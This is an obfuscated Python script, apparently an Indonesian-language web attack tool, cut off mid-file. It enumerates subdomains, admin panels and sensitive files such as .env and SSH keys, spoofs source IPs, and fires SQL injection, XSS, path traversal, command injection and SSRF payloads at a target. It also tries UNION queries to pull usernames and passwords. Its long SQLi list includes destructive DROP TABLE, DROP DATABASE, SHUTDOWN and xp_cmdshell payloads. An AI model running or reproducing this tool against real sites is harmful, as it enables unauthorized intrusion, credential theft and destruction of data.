#!/usr/bin/env python3
Aa='Ga nemu apa-apa'
AZ='bold cyan'
AY='Metadata'
AX="<body onload=alert('XSS')>"
AW='<svg/onload=alert(1)>'
AV="'><img src=x onerror=alert('XSS')>"
AU='"><script>alert(\'XSS\')</script>'
AT="<script>alert('XSS')</script>"
AS='Sensitive Files'
AR='Sensitive Directories'
AQ='Admin Pages'
AP='management'
AO='dashboard'
AN='backend'
AM='cpanel'
AL='controlpanel'
AK='adminpanel'
AJ='admin_area'
AI='administrator'
AH='SQL Injection'
AG='warning'
AF='syntax'
AE="' OR 1=1 LIMIT 1 OFFSET 5--"
AD="' OR '1'='1' -- "
AC="' OR '1'='1"
AB='Subdomains'
AA='admin5'
A9='manager'
A8='admin4'
A7='office'
A6='sandbox'
A5='community'
A4='download'
A3='images'
A2='assets'
A1='static'
A0='admin3'
z='admin2'
y='admin1'
x='demo'
w='alpha'
v='beta'
u='account'
t='sales'
s='report'
r='help'
q='files'
p='media'
o='docs'
n='support'
m='api'
l='shop'
k='secure'
j='staging'
i='dev'
h='test'
g='Phone Numbers'
f='Emails'
e=False
d=range
a='error'
Z='database'
Y="' OR '1'='1' /*"
X='manage'
W='control'
V='panel'
U='portal'
T='admin'
S=', '
R=set
P='red'
O=input
M=None
L=tuple
K=isinstance
J=enumerate
I=True
H=''
G='green'
D='yellow'
C='cyan'
import sys,asyncio as B,aiohttp
from aiohttp import ClientTimeout as Ab,TCPConnector as Ac,ClientConnectorError as Ad
from urllib.parse import urljoin as N,urlparse as Ae,urlencode as E
import random as Q,re,os
from bs4 import BeautifulSoup as Af
from rich.console import Console
from rich.table import Table
A=Console()
def Ag():
	E='user-agent.txt';B=[]
	if os.path.exists(E):
		with open(E,'r')as F:
			for G in F:
				D=G.strip()
				if D:B.append(D)
		if B:A.print('[INFO] User-Agent di-load dari file user-agent.txt',style=C)
	if not B:B=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/110.0.5481.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0','Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1'];A.print('[INFO] Menggunakan default User-Agent.',style=C)
	return B
Ah=Ag()
def Ai():return'.'.join(str(Q.randint(1,255))for A in d(4))
Aj=os.environ.get('PROXY')
Ak=B.Semaphore(10)
def Al(custom_headers=M):
	A=custom_headers;B={'User-Agent':Q.choice(Ah),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','X-Forwarded-For':Ai()}
	if A:B.update(A)
	return B
async def F(url,session,method='GET',data=M,headers=M,retries=2):
	C=url;H=headers or Al();await B.sleep(Q.uniform(.5,1.5))
	async with Ak:
		for G in d(retries):
			try:
				async with session.request(method,C,data=data,headers=H,proxy=Aj)as F:I=await F.text(errors='ignore');return F.status,I,F.headers
			except Ad as E:
				if'No address associated with hostname'in str(E):A.print(f"[INFO] {C} nggak resolve (DNS error).",style=D);return M,M,M
				A.print(f"[ERROR] Request ke {C} gagal (attempt {G+1}): {E}",style=P);await B.sleep(1)
			except Exception as E:A.print(f"[ERROR] Request ke {C} gagal (attempt {G+1}): {E}",style=P);await B.sleep(1)
		return M,M,M
async def Am(url,session):
	H='Unknown';B=url;A.print(f"[INFO] Cek koneksi ke [bold]{B}[/bold]...",style=C);E,J,D=await F(B,session)
	if E==200:A.print(f"[SUCCESS] {B} terhubung!",style=G);A.print(f"[INFO] Server: {D.get("Server",H)}");A.print(f"[INFO] Content-Type: {D.get("Content-Type",H)}");A.print(f"[INFO] HTTPS: {"Yes"if B.startswith("https://")else"No"}");return I,D
	else:A.print(f"[FAILED] Gagal konek ke {B} (Status: {E})",style=P);return e,M
async def An(url,session,report):
	I=report;A.print('[INFO] Extracting contacts (email & phone)...',style=C);J,B,K=await F(url,session)
	if J and B:
		E=R(re.findall('[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+',B));H=R(re.findall('(\\+?\\d[\\d \\-]{8,}\\d)',B))
		if E:A.print(f"[FOUND] Emails: {S.join(E)}",style=G);I[f].extend(E)
		else:A.print('[INFO] Ga nemu email.',style=D)
		if H:A.print(f"[FOUND] Phone Numbers: {S.join(H)}",style=G);I[g].extend(H)
		else:A.print('[INFO] Ga nemu nomor.',style=D)
	else:A.print(f"[ERROR] Gagal extract kontak dari {url}",style=P)
async def Ao(url,session,report):
	A.print('[INFO] Nyari subdomains...',style=C);N=Ae(url);O=N.netloc;P=N.scheme;Q=['www',T,h,'mail','ftp',i,j,k,'blog',l,m,'m',n,U,'monitor','webmail',o,V,'vpn','git','db',p,'app',q,'status','devops',r,'cloud',s,t,'partners',u,v,w,x,'live','beta1','beta2','beta3','api1','api2','api3','mail1','mail2','mail3','ftp1','ftp2','ftp3','dev1','dev2','dev3','test1','test2','test3',y,z,A0,'secure1','secure2','portal1','portal2','panel1','panel2','vpn1','vpn2','git1','git2','db1','db2','media1','media2','app1','app2','files1','files2','status1','status2','devops1','devops2','help1','help2','cloud1','cloud2','report1','report2','sales1','sales2','partners1','partners2','account1','account2','cdn','cache',A1,A2,A3,'videos','wiki','forum','news','press',A4,'store',A5,'beta-test','alpha-test','stage','preview',A6,'internal','intranet',A7,'server','servers','system','sys','support2','mail4','ftp4','dev4','test4',A8,'secure3','portal3','panel3','vpn3','git3','db3','media3','app3','files3','status3','devops3','help3','cloud3','report3','sales3','partners3','account3','web','online','internet','core','central',W,X,A9,'data','info','info1','info2','service','services','main','primary','alpha1','alpha2','alpha3','beta4','gamma','delta','epsilon','zeta','theta','iota','kappa','lambda','mu','nu','xi','omicron','pi','rho','sigma','tau','upsilon','phi','chi','psi','omega','panel4','vpn4','db4','api4',AA,'test5','mail5','ftp5','dev5','staging5','secure5','portal5','panel5','vpn5','git5','cdn1','cdn2','cdn3','cdn4','testzone'];R=[]
	for Y in Q:E=f"{P}://{Y}.{O}";R.append(B.create_task(F(E,session)))
	Z=await B.gather(*R,return_exceptions=I)
	for(a,S)in J(Z):
		E=f"{P}://{Q[a]}.{O}"
		if K(S,L):
			H,b,b=S
			if H==200:A.print(f"[FOUND] Subdomain: {E}",style=G);report[AB].append(E)
			elif H is M:continue
			else:A.print(f"[NOT FOUND] {E} (Status: {H})",style=D)
async def Ap(url,session,report):
	N=session;A.print('[INFO] Ngejalanin SQL Injection test...',style=C);O=["'",'"',AC,AD,Y,AE];P=[]
	for S in O:M=f"{url}?id={E({H:S})[1:]}";P.append(B.create_task(F(M,N)))
	T=await B.gather(*P,return_exceptions=I)
	for(U,Q)in J(T):
		M=f"{url}?id={E({H:O[U]})[1:]}"
		if K(Q,L):
			V,R,W=Q
			if V==200 and R and any(A in R.lower()for A in['sql',Z,AF,AG,a]):A.print(f"[FOUND] SQLi potential: {M}",style=G);report[AH].append(M);await Aq(M,N)
			else:A.print(f"[NOT FOUND] {M}",style=D)
async def Aq(test_url,session):
	B=test_url;A.print(f"[INFO] Extracting data dari: {B}",style=C);J="' UNION SELECT null, username, password FROM users--";K=B.replace('id=',f"id={E({H:J})[1:]}");L,I,N=await F(K,session)
	if L==200 and I:M=I[:300].replace('\n',' ');A.print(f"[DATA EXTRACTED] Snippet: {M}...",style=G)
	else:A.print(f"[INFO] Ga ada data yang keextract dari {B}",style=D)
async def Ar(url,session,report):
	Q='admincpanel';A.print('[INFO] Nyari halaman admin...',style=C);H=[T,AI,y,z,A0,A8,AA,'admin6','admin7','admin8','admin9','login','admin/login','administrator/login','loginadmin','adminlogin',AJ,'admin-area',AK,'admin-panel',AL,'control-panel','admincontrol','admin-control',AM,'admincp','adm',AN,AO,X,AP,'managementpanel','webadmin','webadminpanel',V,'adminpanel2','admin123','admin1234','adminportal',U,'admin-portal',W,'controlcenter','admincenter','admin-dashboard','admin_dashboard','administrator_dashboard','adminpage','admin-page','adminloginpage','loginpage','systemadmin','system-admin','superadmin','super-admin','root','adminroot','staff','stafflogin','useradmin','user-admin','secureadmin','secure-admin','serveradmin','server-admin','boss','director','managementarea','backendadmin','dashboardadmin','admintools','admin-tools','management-tools','controlpaneltools','cpaneltools','sysadmin','sys-admin','ops','operations','operationsadmin',A7,'adminoffice','backendlogin','systemlogin','adminsystem','console','adminconsole','siteadmin','site-admin','owner','mainadmin','portaladmin','paneladmin','adminarea1','adminarea2','adminarea3','adminarea4','adminarea5','administratorarea','administrator-area','controlcenteradmin','controlpanelarea','admintool','backoffice','back-office','myadmin','my-admin','adminsection','admin-section','administration','administra','bossadmin','topadmin','eliteadmin','professionaladmin','secureportal','securepanel',Q,'controlpanelcp',Q,'administratorcp','adminareaonline','webadmincp','internetadmin','hostadmin','host-admin','supportadmin','adminsupport','portalcontrol','controlroom','admincontrolroom','networkadmin','network-admin','syscontrol','systemcontrol','adminsys','admin-panel1','admin-panel2','admin-panel3','admindashboard','dashboardcontrol','admindash','control-dash','adminconsole1','adminconsole2','managementconsole','controlcenterpanel','admincenterpanel','manageportal','portalmanage','adminmaster','masteradmin','topadminpanel','bosscontrol','vipadmin','exclusiveadmin','admindata','datacontrol','admindb','databaseadmin','dbadmin','adminpanellogin','admin-login-page','logincontrol','adminaccess','admin-access','adminalt','altadmin','secondaryadmin','adminportal2','adminzone','admin-zone','controlzone','managementzone','zoneadmin','administrative','adminloginpanel','loginpanel','backendpanel','panelbackend','adminmain','mainpanel','systempanel','panel-system','backpanel','poweradmin','adminpower','superuser','suadmin','rootadmin','adminrootpanel','cadmin','cloudadmin','admincloud','serverpanel','adminserver','networkpanel','adminnetwork','admininterface','interfaceadmin'];M=[]
	for R in H:E=N(url,R);M.append(B.create_task(F(E,session)))
	S=await B.gather(*M,return_exceptions=I)
	for(Y,O)in J(S):
		E=N(url,H[Y])
		if K(O,L):
			P,Z,Z=O
			if P==200:A.print(f"[FOUND] Halaman Admin: {E}",style=G);report[AQ].append(E)
			else:A.print(f"[NOT FOUND] {E} (Status: {P})",style=D)
async def As(url,session,report):
	A.print('[INFO] Ngejalanin Directory Bruteforce...',style=C);H=[T,'login',AI,AK,AM,AN,AL,AO,V,A9,'staff','user','users',u,'accounts','member','members','customer','customers','client','clients',U,'home','profile','profiles','billing','checkout','cart','order','orders',l,'store','market','products','product','catalog','inventory',t,n,r,'contact','about','info','documentation',o,'manual','setup','install','config','configuration','configs','settings','log','logs',a,'errors','debug','data',Z,'db','backup','backups','archive','archives','old','deprecated',x,'sample',h,'testing',A6,v,w,'development',i,j,'preprod','prod','production','secret','hidden','private',k,'ssl','certificate','certs','conf','include','includes','lib','libs','library','classes','class','modules','module','plugins','plugin','themes','theme','uploads',q,A3,'img','pictures','photos',p,A2,A1,'css','js','fonts','tmp','temp','cache','oldsite','testsite','new','backup_old','misc','others','extras','datafiles','exports','import','imports',m,'v1','v2','v3','ajax','widgets','releases','version','versions','rss','feed','feeds','news','press','updates','update','changelog','event','events','calendar','forum','forums',A5,'social','membersarea','securearea','restricted',A4,'downloads','resource','resources','newsletter','subscribe','unsubscribe','terms','privacy','policy','legal',AJ,W,X,AP,'cp','order_history','support_ticket','tickets','faqs','faq','guide','guides','tutorial','tutorials','knowledgebase','kb','contact_us','feedback',s,'reports','stats','statistics','performance','monitoring','access','logins','signin','signout','forgot','reset','password','pwd','installer','init','startup','shutdown'];M=[]
	for Q in H:E=N(url,Q);M.append(B.create_task(F(E,session)))
	R=await B.gather(*M,return_exceptions=I)
	for(S,O)in J(R):
		E=N(url,H[S])
		if K(O,L):
			P,Y,Y=O
			if P==200:A.print(f"[FOUND] Directory/File: {E}",style=G);report[AR].append(E)
			else:A.print(f"[NOT FOUND] {E} (Status: {P})",style=D)
async def At(url,session,report):
	A.print('[INFO] Nge-scan file sensitif...',style=C);H=['.env','robots.txt','.htaccess','wp-config.php','config.json','backup.zip','db.sql','error.log','debug.log','composer.json','package.json','.gitignore','config.php','nginx.conf','apache2.conf','database.sql','backup.sql','dump.sql','db_backup.sql','mysql_backup.sql','old_config.php','config_old.php','db_old.sql','backup.tar','backup.tar.gz','dump.tar','dump.zip','mysql_dump.sql','mysql_backup.zip','backup.bak','config.bak','secret.txt','passwords.txt','passwd','shadow','web.config','local.xml','settings.xml','database_backup.sql','config_backup.php','wp-config-sample.php','php.ini','my.cnf','admin.sql','admin.bak','db_dump.sql','dump_backup.sql','config.yml','config.yaml','secret.key','private.key','public.key','ssl.key','ssl.crt','certificate.crt','server.key','server.crt','id_rsa','id_dsa','id_ecdsa','authorized_keys','access.log','error_log','debug_log','log.txt','logs.txt','system.log','php_error.log','db.log','user.log','mail.log','nginx_error.log','apache_error.log','install.php','setup.php','readme.txt','readme.md','changelog.txt','version.txt','upgrade.txt','old_site.zip','site_backup.zip','database_dump.sql','dump.sql.gz','cms_config.php','config.inc.php','config.php.old','config.php.bak','backup_config.php','sql_backup.sql','mysqldump.sql','backup_data.sql','users.sql','user_data.sql','login.php','admin_login.php','adminarea.php','adminpanel.php','config_admin.php','config_local.php','phpmyadmin.config.inc.php','config.sample.php','database.config.php','db_config.php','dbconfig.php','database.php','install.sql','setup.sql','upgrade.sql','config_backup.json','env.php','.env.local','.env.production','.env.development','.env.testing','secrets.env','credentials.json','credentials.php','sensitive.txt','keys.txt','private.pem','public.pem','private_key.pem','public_key.pem','db_credentials.txt','mysql_credentials.txt','config_backup.ini','config.ini','database.ini','config.php.ini','backup.ini','users_backup.sql','backup_users.sql','admin_backup.sql','db_admin.sql','sql_admin_dump.sql','core_config.php','system_config.php','server_config.php','apache_config.php','nginx_config.php','error_backup.log','debug_backup.log','logs_backup.zip','backup_logs.zip','system.ini','boot.ini','update.sql','recovery.sql','restore.sql','archive.zip','archive.tar','archive.tar.gz','backup_archive.zip','source_backup.zip','data_dump.sql','config.dump','dump_config.php','old_backup.zip','old_dump.sql','previous_backup.sql','site.sql','wp_backup.sql','wp_dump.sql','mysql_dump.zip','db_dump.zip','dumpfile.sql','dumpfile.zip','users_backup.zip','config.php.swp','temp.sql','tmp.sql','recent_backup.sql','prod_config.php','prod.env','production.env','dev.env','staging.env','test.env','backup_prod.sql','backup_dev.sql','backup_staging.sql','release_notes.txt','changelog.md','debug.php','test.php','example.php','sample.php','old_index.php','temp_config.php','db_connection.php','database_connection.php','wp-config.backup.php','wp-config.old.php','wp-config.dev.php','wp-config.staging.php','api_key.txt','secret_config.ini','secure_config.php','vulnerabilities.txt'];M=[]
	for Q in H:E=N(url,Q);M.append(B.create_task(F(E,session)))
	R=await B.gather(*M,return_exceptions=I)
	for(S,O)in J(R):
		E=N(url,H[S])
		if K(O,L):
			P,T,T=O
			if P==200:A.print(f"[FOUND] Sensitive File: {E}",style=G);report[AS].append(E)
			else:A.print(f"[NOT FOUND] {E} (Status: {P})",style=D)
async def Au(url,session,report):
	A.print('[INFO] Ngejalanin XSS test...',style=C);N=[AT,AU,AV,AW,AX];O=[]
	for S in N:M=f"{url}?q={E({H:S})[1:]}";O.append(B.create_task(F(M,session)))
	T=await B.gather(*O,return_exceptions=I)
	for(P,Q)in J(T):
		M=f"{url}?q={E({H:N[P]})[1:]}"
		if K(Q,L):
			U,R,V=Q
			if U==200 and R and N[P].lower()in R.lower():A.print(f"[FOUND] XSS potential: {M}",style=G);report['XSS'].append(M)
			else:A.print(f"[NOT FOUND] {M}",style=D)
async def Av(url,session,report):
	A.print('[INFO] Ngejalanin LFI test...',style=C);N=['../../../../etc/passwd','../../../../etc/hosts','../../../../windows/win.ini','../../../../../../proc/self/environ','../../../../etc/shadow','../../../../var/log/auth.log','../../../../var/log/syslog','../../../../proc/version','../../../../proc/cpuinfo','../../../../proc/meminfo','../../../../etc/group','../../../../etc/issue','../../../../etc/network/interfaces','../../../../etc/resolv.conf','../../../../root/.bash_history','../../../../root/.ssh/id_rsa','../../../../root/.ssh/authorized_keys','../../../../home/user/.bashrc','../../../../home/user/.profile','../../../../home/user/.ssh/id_rsa','../../../../home/user/.ssh/authorized_keys','../../../../var/www/html/config.php','../../../../var/www/html/wp-config.php','../../../../var/lib/mysql/mysql.sock','../../../../etc/mysql/my.cnf','../../../../etc/httpd/conf/httpd.conf','../../../../etc/nginx/nginx.conf','../../../../etc/php/php.ini','../../../../var/log/apache2/access.log','../../../../var/log/apache2/error.log','../../../../var/log/nginx/access.log','../../../../var/log/nginx/error.log','../../../../var/log/mysql/error.log','../../../../usr/local/apache2/conf/httpd.conf','../../../../usr/local/etc/php.ini','../../../../var/lib/php/sessions','../../../../tmp/sess_*','../../../../windows/system32/drivers/etc/hosts','../../../../windows/system.ini','../../../../windows/php.ini','../../../../windows/system32/config/systemprofile/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup','../../../../windows/system32/config/SAM','../../../../windows/system32/config/SECURITY','../../../../windows/system32/config/software','../../../../windows/system32/config/system','../../../../windows/system32/config/regback/sam','../../../../windows/system32/config/regback/security','../../../../windows/system32/config/regback/software','../../../../windows/system32/config/regback/system'];O=[]
	for R in N:M=f"{url}?file={E({H:R})[1:]}";O.append(B.create_task(F(M,session)))
	S=await B.gather(*O,return_exceptions=I)
	for(T,P)in J(S):
		M=f"{url}?file={E({H:N[T]})[1:]}"
		if K(P,L):
			U,Q,V=P
			if U==200 and Q and'root:'in Q:A.print(f"[FOUND] LFI potential: {M}",style=G);report['LFI'].append(M)
			else:A.print(f"[NOT FOUND] {M}",style=D)
async def Aw(url,session,report):
	A.print('[INFO] Ngejalanin RCE test...',style=C);O=['; ping -c 1 127.0.0.1','; nslookup 127.0.0.1','| id','&& whoami','; cat /etc/passwd','&& ls -la','|| echo injected','`uname -a`','$(id)','; netstat -an','&& sleep 5',"; echo 'pwned'"];P=[]
	for R in O:M=f"{url}?cmd={E({H:R})[1:]}";P.append(B.create_task(F(M,session)))
	S=await B.gather(*P,return_exceptions=I)
	for(T,Q)in J(S):
		M=f"{url}?cmd={E({H:O[T]})[1:]}"
		if K(Q,L):
			U,N,V=Q
			if U==200 and N and('uid='in N or'Linux'in N):A.print(f"[FOUND] RCE potential: {M}",style=G);report['RCE'].append(M)
			else:A.print(f"[NOT FOUND] {M}",style=D)
async def Ax(url,session,report):
	A.print('[INFO] Ngejalanin SSRF test...',style=C);N=['http://127.0.0.1','http://localhost','http://169.254.169.254/latest/meta-data/','http://[::1]','http://127.0.0.1:80','http://localhost:80','http://0.0.0.0','http://127.0.0.1:22','http://169.254.169.254/','http://metadata.google.internal/','http://169.254.169.254/metadata/v1/','http://[::1]:80','http://127.0.0.1/admin','http://localhost/admin'];O=[]
	for R in N:M=f"{url}?url={E({H:R})[1:]}";O.append(B.create_task(F(M,session)))
	S=await B.gather(*O,return_exceptions=I)
	for(T,P)in J(S):
		M=f"{url}?url={E({H:N[T]})[1:]}"
		if K(P,L):
			U,Q,V=P
			if U==200 and Q and'metadata'in Q.lower():A.print(f"[FOUND] SSRF potential: {M}",style=G);report['SSRF'].append(M)
			else:A.print(f"[NOT FOUND] {M}",style=D)
async def Ay(url,session,report,max_pages=10):
	A.print('[INFO] Mulai crawling website...',style=C);B=R();D=[url];H=0
	while D and H<max_pages:
		E=D.pop(0)
		if E in B:continue
		B.add(E);L,J,P=await F(E,session)
		if L==200 and J:
			M=Af(J,'html.parser')
			for O in M.find_all('a',href=I):
				G=O['href'];K=G if G.startswith('http')else N(url,G)
				if K not in B:D.append(K)
		H+=1
	report[AY].extend(list(B))
def b(report):
	B=Table(title='Scan Report');B.add_column('Category',style=C,no_wrap=I);B.add_column('Results',style='magenta')
	for(E,D)in report.items():B.add_row(E,S.join(D)if D else'None')
	A.print(B)
def c(report):
	D='scan_report.txt'
	with open(D,'w')as B:
		for(F,E)in report.items():
			B.write(f"{F}:\n")
			if E:
				for G in E:B.write(f"  - {G}\n")
			else:B.write('  None\n')
			B.write('\n')
	A.print(f"[INFO] Report disimpan di {D}",style=C)
async def Az(session,report):
	e="' AND 1=2/*";d="' AND 1=1/*";c="'; DROP TABLE users;--";b="' OR 1=1#";X="' OR 1=1--";S="' OR 'a'='a";R="' OR 1=1/*";A.print('\n[INFO] Advanced SQL Injection Scan',style=AZ);N=O('Masukkan URL target untuk SQL Injection (tanpa parameter, misal: http://example.com/page.php): ').strip();P=O('Masukkan nama parameter untuk SQL Injection (misal: id): ').strip();f=f"{N}?{P}=1";A.print(f"[INFO] Menggunakan URL: {f}",style=C);T=["'",'"',AC,AD,Y,"' OR 1=1",X,b,R,"' OR '1'='1' AND ''='","' OR '1'='1' AND '1'='1",S,"' OR 1=1;--","' OR 1=1;#","' OR 1=1;/*",c,"'; DROP TABLE users;#","'; DROP TABLE users;/*","' OR EXISTS(SELECT * FROM users) --","' OR EXISTS(SELECT * FROM information_schema.tables) --","' OR 1 IN (SELECT MIN(name) FROM sysobjects) --","' OR 1 IN (SELECT MIN(username) FROM users) --","' OR 1 IN (SELECT MIN(password) FROM users) --","' AND (SELECT COUNT(*) FROM users) > 0 --","' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --","' AND 1=(SELECT COUNT(*) FROM users) --","' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --","' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,2,3--","' UNION SELECT 'a','b','c'--","' UNION SELECT username, password, null FROM users--","' UNION SELECT 1, username, password FROM users--","' UNION ALL SELECT username, password, null FROM users--","' UNION ALL SELECT 1,2,3--","' UNION ALL SELECT 'a','b','c'--","' AND 1=CONVERT(int, 'a')--","' OR 1=CONVERT(int, 'a')--","' OR SLEEP(5)--","'; WAITFOR DELAY '0:0:5'--","'; IF (1=1) WAITFOR DELAY '0:0:5'--","'; IF (1=2) WAITFOR DELAY '0:0:5'--","' AND SLEEP(5)--","' OR BENCHMARK(1000000, MD5('test'))--","' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--","' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--","' AND (SELECT SUBSTRING(@@version,1,1)) = '4'--","' OR (SELECT SUBSTRING(@@version,1,1)) = '5'--","' OR (SELECT SUBSTRING(@@version,1,1)) = '4'--","' AND (SELECT IF(1=1, SLEEP(5), 0))--","' OR (SELECT IF(1=1, SLEEP(5), 0))--","' OR 1=1 LIMIT 1--","' OR '1'='1' LIMIT 1--","' OR '1'='1' ORDER BY 1--","' OR '1'='1' ORDER BY 2--","' OR '1'='1' ORDER BY 3--","' OR '1'='1' ORDER BY 4--","' OR '1'='1' ORDER BY 5--","' OR '1'='1' ORDER BY 6--","' OR '1'='1' ORDER BY 7--","' OR '1'='1' ORDER BY 8--","' OR '1'='1' ORDER BY 9--","' OR '1'='1' ORDER BY 10--","' UNION SELECT 1,2,version()--","' UNION SELECT 1,database(),3--","' UNION SELECT 1,@@version,3--","' UNION SELECT 1,user(),3--","' UNION SELECT null,@@version,null--","' UNION SELECT null,database(),null--","' UNION SELECT null,user(),null--","' UNION ALL SELECT null,@@version,null--","' UNION ALL SELECT null,database(),null--","' UNION ALL SELECT null,user(),null--","' AND 1=(SELECT COUNT(*) FROM information_schema.columns)--","' AND 1=(SELECT COUNT(*) FROM users)--","' AND 1=(SELECT COUNT(*) FROM orders)--","' OR 1 IN (SELECT COUNT(*) FROM information_schema.columns)--","' OR 1 IN (SELECT COUNT(*) FROM users)--","' OR 1 IN (SELECT COUNT(*) FROM orders)--","' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--","' AND ASCII(SUBSTRING((SELECT database()),1,1)) < 90--","' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 64--","' OR ASCII(SUBSTRING((SELECT database()),1,1)) < 90--","' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0--","' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0--","' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0--","' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0--","' AND EXISTS(SELECT * FROM users)--","' OR EXISTS(SELECT * FROM users)--","' AND EXISTS(SELECT * FROM information_schema.tables)--","' OR EXISTS(SELECT * FROM information_schema.tables)--","'; EXEC xp_cmdshell('dir')--","'; EXEC xp_cmdshell('whoami')--","'; EXEC xp_cmdshell('ipconfig')--","'; EXEC master..xp_cmdshell 'dir'--","'; EXEC master..xp_cmdshell 'whoami'--","'; EXEC master..xp_cmdshell 'ipconfig'--","'; SHUTDOWN --","'; DROP DATABASE test;--",c,"'; DROP TABLE orders;--",S,"' OR 'a'='a' --","' OR 'a'='a' /*",X,b,R,"' OR '1'='1' AND 1=1--","' OR '1'='1' AND 1=2--","' OR 'a'='a' AND 'b'='b'--","' OR 1=1 AND 1=1--","' OR 1=1 AND 1=2--","' AND 1=1--","' AND 1=2--","' AND 1=1#","' AND 1=2#",d,e,"'; SELECT * FROM users--","'; SELECT username, password FROM users--","'; SELECT * FROM information_schema.tables--","'; SELECT * FROM information_schema.columns--","'; SELECT * FROM orders--","' OR EXISTS(SELECT * FROM users WHERE username='admin')--","' OR NOT EXISTS(SELECT * FROM users WHERE username='admin')--","' AND LENGTH(database()) > 0--","' OR LENGTH(database()) > 0--","' AND LENGTH(user()) > 0--","' OR LENGTH(user()) > 0--","' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--","' OR (SELECT COUNT(*) FROM users WHERE username='admin') > 0--","' AND (SELECT AVG(LENGTH(password)) FROM users) > 5--","' OR (SELECT AVG(LENGTH(password)) FROM users) > 5--","' AND (SELECT SUM(LENGTH(username)) FROM users) > 10--","' OR (SELECT SUM(LENGTH(username)) FROM users) > 10--","' UNION SELECT NULL,NULL,CONCAT_WS(':',user(),database())--","' UNION ALL SELECT NULL,NULL,CONCAT_WS(':',user(),database())--","' AND 1=1; EXEC xp_cmdshell('dir')--","'; EXEC xp_cmdshell('calc')--","'; EXEC xp_cmdshell('notepad')--","' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--","' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--","' AND (SELECT TOP 1 name FROM master.dbo.sysdatabases) IS NOT NULL--","' OR (SELECT TOP 1 name FROM master.dbo.sysdatabases) IS NOT NULL--","' AND (SELECT COUNT(*) FROM sysobjects) > 0--","' OR (SELECT COUNT(*) FROM sysobjects) > 0--","' AND (SELECT COUNT(*) FROM syscolumns) > 0--","' OR (SELECT COUNT(*) FROM syscolumns) > 0--","' AND (SELECT TOP 1 column_name FROM information_schema.columns) IS NOT NULL--","' OR (SELECT TOP 1 column_name FROM information_schema.columns) IS NOT NULL--","' AND (SELECT TOP 1 table_name FROM information_schema.tables) IS NOT NULL--","' OR (SELECT TOP 1 table_name FROM information_schema.tables) IS NOT NULL--","' AND (SELECT MIN(username) FROM users) IS NOT NULL--","' OR (SELECT MIN(username) FROM users) IS NOT NULL--","' AND (SELECT MAX(password) FROM users) IS NOT NULL--","' OR (SELECT MAX(password) FROM users) IS NOT NULL--","' AND (SELECT database()) = database()--","' OR (SELECT database()) = database()--","' AND (SELECT user()) = user()--","' OR (SELECT user()) = user()--","' AND (SELECT version()) = version()--","' OR (SELECT version()) = version()--","' AND (SELECT @@version) IS NOT NULL--","' OR (SELECT @@version) IS NOT NULL--","' AND (SELECT SLEEP(5)) IS NULL--","' OR (SELECT SLEEP(5)) IS NULL--","' AND (SELECT BENCHMARK(1000000, MD5('test'))) IS NULL--","' OR (SELECT BENCHMARK(1000000, MD5('test'))) IS NULL--","' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--","' OR 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--","' AND 1=(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())--","' OR 1=(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())--","' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE '%')--","' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE '%')--","' AND 'a'='a","' AND 'a'='b",S,"' OR 'a'='b","' AND 1=1--+","' OR 1=1--+","' AND 1=2--+","' OR 1=2--+",d,R,e,"' OR 1=2/*","' UNION SELECT NULL,NULL,NULL,NULL--","' UNION ALL SELECT NULL,NULL,NULL,NULL--","' UNION SELECT 1,2,3,4--","' UNION ALL SELECT 1,2,3,4--","' UNION SELECT 'a','b','c','d'--","' UNION ALL SELECT 'a','b','c','d'--",Y,"' OR '1'='1' //","' OR '1'='1' \\","' OR 1=1 LIMIT 1 OFFSET 0--","' OR 1=1 LIMIT 1 OFFSET 1--","' OR 1=1 LIMIT 1 OFFSET 2--","' OR 1=1 LIMIT 1 OFFSET 3--","' OR 1=1 LIMIT 1 OFFSET 4--",AE];U=[]
	for g in T:M=f"{N}?{P}={E({H:g})[1:]}";U.append(B.create_task(F(M,session)))
	h=await B.gather(*U,return_exceptions=I);Q=[]
	for(i,V)in J(h):
		M=f"{N}?{P}={E({H:T[i]})[1:]}"
		if K(V,L):
			j,W,k=V
			if j==200 and W and any(A in W.lower()for A in['sql',Z,AF,AG,a]):A.print(f"[FOUND] Advanced SQLi potential: {M}",style=G);Q.append(M)
			else:A.print(f"[NOT FOUND] {M}",style=D)
	report['Advanced SQL Injection']=Q if Q else[Aa]
async def A_(session,report):
